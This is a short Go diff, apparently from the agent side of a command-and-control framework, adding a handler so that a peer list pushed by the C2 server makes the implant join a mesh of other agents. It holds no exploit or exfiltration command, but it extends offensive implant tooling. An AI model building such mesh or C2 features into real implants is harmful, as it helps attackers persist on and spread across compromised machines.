@@ -45,6 +45,14 @@ func HandleC2Command(cmdData *def.MsgTunData) {
 		return
 	}
 
+	// Process PeerList pushed by C2 for mesh discovery
+	if cmdData.Tag == def.TagPeerList {
+		if len(cmdData.PeerList) > 0 {
+			mesh.Join(cmdData.PeerList)
+		}
+		return
+	}
+
 	job_id := cmdData.JobID
 	cmd_argc := len(cmdData.CmdSlice)
 	cmdSlice := append(cmdData.CmdSlice, []string{"--job_id", job_id}...)
